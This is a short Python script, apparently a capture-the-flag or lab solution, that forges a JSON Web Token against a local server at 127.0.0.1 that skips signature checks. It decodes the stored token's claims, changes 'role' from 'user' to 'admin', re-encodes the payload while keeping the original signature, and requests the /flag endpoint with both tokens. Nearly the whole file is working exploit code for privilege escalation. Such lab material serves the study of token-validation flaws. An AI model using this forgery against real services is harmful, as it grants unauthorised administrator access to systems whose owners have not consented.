import base64
import json
import urllib.request
import urllib.error
from pathlib import Path

def encode(value):
    raw = json.dumps(value, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

def broken_verify(token):
    payload = token.split('.')[1]
    return json.loads(base64.urlsafe_b64decode(payload + '='*(-len(payload) % 4)))

def request_flag(token):
    request = urllib.request.Request('http://127.0.0.1:18765/flag', headers={'Authorization': 'Bearer ' + token})
    try:
        with urllib.request.urlopen(request) as response:
            return response.status, response.read().decode()
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode()

token = json.loads(Path(__file__).with_name('session-response.txt').read_text())['token']
header, payload, signature = token.split('.')
claims = broken_verify(token)
print('baseline claims:', claims)
print('baseline GET /flag:', request_flag(token))
claims['role'] = 'admin'
modified = header + '.' + encode(claims) + '.' + signature
assert broken_verify(token)['role'] == 'user'
assert broken_verify(modified)['role'] == 'admin'
print('modified:', modified)
print('modified GET /flag:', request_flag(modified))
